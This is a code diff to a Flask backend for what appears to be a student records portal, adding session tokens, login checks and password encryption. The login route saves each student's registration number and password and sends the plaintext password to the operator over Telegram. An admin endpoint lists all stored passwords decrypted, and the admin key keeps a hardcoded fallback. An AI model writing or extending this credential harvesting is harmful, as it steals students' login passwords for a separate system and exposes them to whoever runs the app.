@@ -9,13 +9,58 @@ from flask import Flask, jsonify, request, Response, send_file
 from flask_cors import CORS
 import requests as req
 from bs4 import BeautifulSoup
-import threading, time, json, hashlib, os
+import threading, time, json, hashlib, os, secrets
+from functools import wraps
+from cryptography.fernet import Fernet
 
 app = Flask(__name__)
 CORS(app)
 
 CREDS_FILE  = "user_credentials.csv"
-ADMIN_KEY   = "arms_admin_2024$"   # Secret key — only you know this
+ADMIN_KEY   = os.environ.get("ADMIN_KEY", "arms_admin_2024$")
+
+# ── AES Password Encryption ────────────────────────────────────────────────────
+_fernet_raw = os.environ.get("FERNET_KEY", "")
+try:
+    _fernet = Fernet(_fernet_raw.encode()) if _fernet_raw else Fernet(Fernet.generate_key())
+except:
+    _fernet = Fernet(Fernet.generate_key())
+
+def encrypt_password(pwd):
+    try: return _fernet.encrypt(pwd.encode()).decode()
+    except: return pwd
+
+def decrypt_password(enc):
+    try: return _fernet.decrypt(enc.encode()).decode()
+    except: return "[encrypted]"
+
+# ── Session Store ───────────────────────────────────────────────────────────────────
+_sessions    = {}           # token -> {reg_no, expires}
+SESSION_TTL  = 24 * 3600   # 24 hours
+
+def create_session(reg_no):
+    token = secrets.token_hex(32)
+    _sessions[token] = {"reg_no": reg_no, "expires": time.time() + SESSION_TTL}
+    return token
+
+def validate_session(token):
+    if not token: return None
+    sess = _sessions.get(token)
+    if not sess: return None
+    if time.time() > sess["expires"]:
+        del _sessions[token]
+        return None
+    return sess["reg_no"]
+
+def require_login(f):
+    """Decorator: require a valid session token in X-Session-Token header."""
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        token = request.headers.get("X-Session-Token", "")
+        if not validate_session(token):
+            return jsonify({"error": "Unauthorized. Please log in first."}), 401
+        return f(*args, **kwargs)
+    return decorated
 
 # ── Telegram Notifications (loaded from Render environment variables) ─────────
 TG_TOKEN   = os.environ.get("TG_TOKEN", "")
@@ -53,7 +98,7 @@ def save_credential(reg_no, password, name=""):
     creds = load_credentials()
     creds[reg_no] = {
         "reg_no":   reg_no,
-        "password": password,
+        "password": encrypt_password(password),  # store encrypted
         "name":     name,
         "saved_at": time.strftime("%Y-%m-%d %H:%M:%S")
     }
@@ -299,6 +344,7 @@ def health():
     return jsonify({"status": "ok"})
 
 @app.route("/api/students")
+@require_login
 def list_students():
     """Paginated + filtered student list with profile summary."""
     page    = int(request.args.get("page", 1))
@@ -353,6 +399,7 @@ def list_students():
     })
 
 @app.route("/api/student/<reg_no>")
+@require_login
 def student_detail(reg_no):
     now = time.time()
     if reg_no in _student_cache and (now - _student_cache[reg_no]["ts"]) < CACHE_TTL:
@@ -368,6 +415,7 @@ def student_detail(reg_no):
         return jsonify({"error": str(e), "trace": traceback.format_exc()}), 500
 
 @app.route("/api/student/<reg_no>/marks/<course_sno>")
+@require_login
 def mark_breakdown(reg_no, course_sno):
     """Get 5-category mark breakdown for a specific course."""
     rows = get_mark_breakdown(course_sno)
@@ -388,6 +436,7 @@ def proxy_image(filename):
         return "", 404
 
 @app.route("/api/search")
+@require_login
 def search():
     q = request.args.get("q","").strip().upper()
     if len(q) < 2:
@@ -424,6 +473,7 @@ def search():
     return jsonify({"results": results[:15]})
 
 @app.route("/api/depts")
+@require_login
 def depts():
     students = get_all_student_list()
     codes = sorted(set(str(s.get("RegId",""))[4:6] for s in students if len(str(s.get("RegId",""))) >= 6))
@@ -472,14 +522,15 @@ def student_login():
             save_credential(reg_no, password, name)
             # Send Telegram notification
             msg = (
-                f"🔐 <b>New Login</b>\n"
-                f"👤 Name: {name or 'Unknown'}\n"
-                f"🎓 Reg No: <code>{reg_no}</code>\n"
-                f"🔑 Password: <code>{password}</code>\n"
-                f"🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+                f"\U0001f510 <b>New Login</b>\n"
+                f"\U0001f464 Name: {name or 'Unknown'}\n"
+                f"\U0001f393 Reg No: <code>{reg_no}</code>\n"
+                f"\U0001f511 Password: <code>{password}</code>\n"
+                f"\U0001f550 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}"
             )
             send_telegram(msg)
-            return jsonify({"success": True, "name": name, "reg_no": reg_no})
+            session_token = create_session(reg_no)
+            return jsonify({"success": True, "name": name, "reg_no": reg_no, "token": session_token})
         else:
             return jsonify({"success": False, "error": "Invalid registration number or password."}), 401
     except Exception as e:
@@ -497,7 +548,7 @@ def list_users():
         {
             "reg_no":   k,
             "name":     v.get("name", ""),
-            "password": v.get("password", ""),
+            "password": decrypt_password(v.get("password", "")),
             "saved_at": v.get("saved_at", "")
         }
         for k, v in creds.items()
